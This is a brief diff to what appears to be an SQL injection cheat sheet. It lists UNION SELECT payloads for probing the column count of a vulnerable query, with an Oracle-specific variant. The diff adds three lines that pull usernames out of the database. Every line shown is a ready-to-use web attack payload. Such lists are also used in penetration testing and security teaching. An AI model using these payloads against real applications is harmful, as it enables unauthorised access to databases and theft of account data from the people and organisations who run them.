@@ -182,6 +182,9 @@ SELECT a, b FROM table1 UNION SELECT c, d FROM table2    --- Basic usage, must b
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT username,2--
+' UNION SELECT username,2,3--
+' UNION SELECT username,2,3,4--
 ' UNION SELECT NULL FROM DUAL-- Oracle specific, SELECT must use FROM query
 --- Find columns with useful data type
 ' UNION SELECT 'a',NULL,NULL,NULL--
